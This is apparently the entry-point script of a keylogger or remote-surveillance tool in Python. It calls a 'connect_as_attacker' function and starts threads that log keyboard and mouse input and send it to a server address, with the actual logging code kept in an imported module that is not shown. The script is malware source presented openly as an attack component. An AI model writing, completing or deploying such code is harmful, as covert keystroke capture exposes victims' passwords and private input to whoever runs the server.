import functions
from threading import Thread

server_ip = ('127.0.0.1', 42069)
ip_for_conection = ('127.0.0.1', 420)

functions.connect_as_attacker(ip_for_connection_as_attacker=ip_for_conection)
Thread(target=functions.log_keyboard, args=(server_ip,)).start()
Thread(target=functions.log_mouse, args=(server_ip,)).start()
